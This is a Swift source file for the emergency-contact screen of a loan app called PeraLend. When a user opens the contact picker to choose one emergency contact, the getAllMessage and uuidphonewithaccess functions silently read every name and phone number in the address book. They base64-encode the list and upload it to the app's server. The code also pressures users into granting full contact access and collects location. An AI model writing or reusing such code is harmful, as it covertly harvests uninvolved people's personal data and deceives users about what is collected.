//
//  PhoneViewController.swift
//  PeraLend
//
//  Created by Jennifer Adams on 2025/7/22.
//

import UIKit
import BRPickerView
import Contacts
import ContactsUI
import TYAlertController

class PhoneViewController: BaseViewController {
    
    var productID: String = ""
    
    var rurModelArray: [rurModel] = []
    
    let contactStore = CNContactStore()
    
    var selectCell: PhoneTableViewCell?
    
    var selectIndex: Int?
    
    var dictArray: [[String: String]] = []
    
    var time: String = ""
    let locationService = LocationService()  // 保留引用
    
    lazy var phoneView: PhoneContView = {
        let phoneView = PhoneContView()
        phoneView.plendImageView.image = UIImage(named: "p_four_image")
        return phoneView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.
        
        locationService.startLocation { locationInfo in
            LocationModelSingle.shared.locationInfo = locationInfo
        }
        
        time = String(Int(Date().timeIntervalSince1970 * 1000))
        
        view.addSubview(phoneView)
        phoneView.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        phoneView.headView.backBlock = { [weak self] in
            guard let self = self else { return }
            let logView = PopLogoutView(frame: CGRectMake(0, 0, screenwidth, screenheight))
            logView.plendImageView.image = UIImage(named: "wan_li_imge")
            let alertVc = TYAlertController(alert: logView, preferredStyle: .alert)!
            self.present(alertVc, animated: true)
            
            logView.dismissblock = {
                self.dismiss(animated: true)
            }
            
            logView.sureblock = {
                self.dismiss(animated: true) {
                    self.popToSelectController()
                }
            }
        }
        
        getPhoneInfo()
        
        
        phoneView.nextBtn.rx.tap.subscribe(onNext: { [weak self] in
            guard let self = self else { return }
            dictArray.removeAll()
            for model in rurModelArray {
                let dict = ["mollfier": model.mollfier ?? "",
                            "exactlyent": model.exactlyent ?? "",
                            "sarcolanditious": model.sarcolanditious ?? "",
                            "tendorium": model.tendorium ?? ""]
                dictArray.append(dict)
            }
            safealibabaInfo(with: dictArray)
        }).disposed(by: disposeBag)
        
        
        phoneView.cellBlock = { [weak self] phonetx, model, cell, index in
            guard let self = self else { return }
            requestContactsAccess()
            selectCell = cell
            selectIndex = index
        }
        
    }
    
    
}

extension PhoneViewController {
    
    private func safealibabaInfo(with dictArray: [[String: String]]) {
        var jstring: String = ""
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: dictArray, options: [])
            if let jsonString = String(data: jsonData, encoding: .utf8) {
                jstring = jsonString
            }
        } catch {
            print("Failed to convert phoneArray to JSON: \(error)")
        }
        ViewHud.addLoadView()
        let dict = ["pinguly": productID, "phrenlike": jstring]
        NetworkManager
            .shared
            .postMultipartFormRequest(url: "/plapiall/annious", parameters: dict) { [weak self] result in
                switch result {
                case .success(let success):
                    guard let self = self else { return }
                    let verscancerern = success.verscancerern
                    if verscancerern == "0" || verscancerern == "00" {
                        bclickProductDetailInfo(with: productID)
                        let endTime = String(Int(Date().timeIntervalSince1970 * 1000))
                        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                            let locationInfo = LocationModelSingle.shared.locationInfo
                            let probar = locationInfo?["probar"] ?? ""
                            let cyston = locationInfo?["cyston"] ?? ""
                            PongCombineManager.goYourPoint(with: self.productID, type: "7", publicfic: self.time, probar: probar, cyston: cyston, endTime: endTime)
                        }
                    }
                    ViewHud.hideLoadView()
                    break
                case .failure(_):
                    ViewHud.hideLoadView()
                    break
                }
            }
    }
    
    func requestContactsAccess() {
        let authorizationStatus = CNContactStore.authorizationStatus(for: .contacts)
        switch authorizationStatus {
        case .notDetermined:
            contactStore.requestAccess(for: .contacts) { [weak self] (granted, error) in
                let authoriz = CNContactStore.authorizationStatus(for: .contacts)
                if #available(iOS 18.0, *) {
                    if authoriz == .limited {
                        DispatchQueue.main.async {
                            self?.showPermissionDeniedAlert(for: "Contact")
                        }
                        return
                    }
                } else {
                    // Fallback on earlier versions
                }
                DispatchQueue.main.async {
                    if !granted {
                        self?.showPermissionDeniedAlert(for: "Contact")
                    } else {
                        self?.accessContacts()
                    }
                }
            }
            break
        case .restricted, .denied:
            self.showPermissionDeniedAlert(for: "To speed up the loan approval process for PeraLend, please do not set your contact permissions to \"Restricted\" or \"None\". Instead, please change them to \"Full Access\".")
            break
        case .authorized:
            DispatchQueue.main.async {
                self.accessContacts()
            }
            break
        case .limited:
            self.showPermissionDeniedAlert(for: "To speed up the loan approval process for PeraLend, please do not set your contact permissions to \"Restricted\" or \"None\". Instead, please change them to \"Full Access\".")
            break
        @unknown default:
            break
        }
    }
    
    private func getPhoneInfo() {
        ViewHud.addLoadView()
        NetworkManager
            .shared
            .postMultipartFormRequest(url: "/plapiall/toughproof", parameters: ["pinguly": productID]) { [weak self] result in
                switch result {
                case .success(let success):
                    guard let self = self else { return }
                    let verscancerern = success.verscancerern
                    if verscancerern == "0" || verscancerern == "00" {
                        self.rurModelArray = success.phrenlike?.torpefold?.rur ?? []
                        self.phoneView.rurModelArray = success.phrenlike?.torpefold?.rur ?? []
                        self.phoneView.tableView.reloadData()
                    }
                    ViewHud.hideLoadView()
                    break
                case .failure(_):
                    ViewHud.hideLoadView()
                    break
                }
            }
    }
    
}

extension PhoneViewController: CNContactPickerDelegate {
    
    func accessContacts() {
        getAllMessage()
        showSystemContactPicker()
    }
    
    func getAllMessage() {
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            var phoneArray: [[String: Any]] = []
            let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey]
            let request = CNContactFetchRequest(keysToFetch: keys as [CNKeyDescriptor])
            do {
                try self?.contactStore.enumerateContacts(with: request) { (contact, stop) in
                    let givenName = contact.givenName
                    let familyName = contact.familyName
                    var fullName = ""
                    if !givenName.isEmpty && !familyName.isEmpty {
                         fullName = "\(givenName) \(familyName)"
                    }else if !givenName.isEmpty && familyName.isEmpty {
                        fullName = "\(givenName)"
                    }else if givenName.isEmpty && !familyName.isEmpty {
                        fullName = "\(familyName)"
                    }else {
                        fullName = ""
                    }
                    let phoneNumbersString = contact.phoneNumbers
                        .map { $0.value.stringValue }
                        .joined(separator: ",")
                    let dict = ["dyistic": phoneNumbersString, "exactlyent": fullName]
                    phoneArray.append(dict)
                }
                self?.uuidphonewithaccess(from: phoneArray)
            } catch {
                print("error: \(error.localizedDescription)")
            }
        }
    }
    
    func showSystemContactPicker() {
        let picker = CNContactPickerViewController()
        picker.delegate = self
        picker.predicateForEnablingContact = NSPredicate(format: "phoneNumbers.@count > 0")
        picker.displayedPropertyKeys = [CNContactPhoneNumbersKey]
        present(picker, animated: true)
    }

    func contactPicker(_ picker: CNContactPickerViewController, didSelect contact: CNContact) {
        
        let givenName = contact.givenName
        let familyName = contact.familyName
        var fullName = ""
        if !givenName.isEmpty && !familyName.isEmpty {
             fullName = "\(givenName) \(familyName)"
        }else if !givenName.isEmpty && familyName.isEmpty {
            fullName = "\(givenName)"
        }else if givenName.isEmpty && !familyName.isEmpty {
            fullName = "\(familyName)"
        }else {
            fullName = ""
        }
        
        guard !fullName.isEmpty else {
            return showToast(message: "Emergency contact name cannot be empty.")
        }
        
        guard let phoneNumber = contact.phoneNumbers.first?.value.stringValue else {
            return showToast(message: "Emergency contact phone number cannot be empty.")
        }
        
        updateSelectedCell(with: fullName, phoneNumber: phoneNumber)
    }

    private func showToast(message: String) {
        ShowHudConfig.makeToast(form: view, message: message)
    }

    private func updateSelectedCell(with name: String, phoneNumber: String) {
        guard let selectCell = selectCell, let index = selectIndex else { return }
        
        selectCell.phoneTx.text = "\(name) - \(phoneNumber)"
        let model = rurModelArray[index]
        model.exactlyent = name
        model.mollfier = phoneNumber
    }
    
    func contactPickerDidCancel(_ picker: CNContactPickerViewController) {
        
    }
    
    private func uuidphonewithaccess(from phoneArray: [[String: Any]]) {
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: phoneArray, options: [])
            let base64String = jsonData.base64EncodedString()
            let dict = ["phrenlike": base64String, "potamowise": "3"]
            upphoneinfowithyouraccess(with: dict)
        } catch {
            print("Failed to convert phoneArray to JSON: \(error)")
        }
    }
    
    private func upphoneinfowithyouraccess(with dict: [String: String]) {
        NetworkManager
            .shared
            .postMultipartFormRequest(url: "/plapiall/theyine", parameters: dict) { result in
                switch result {
                case .success(_):
                    break
                case .failure(_):
                    break
                }
            }
    }
    
    
}
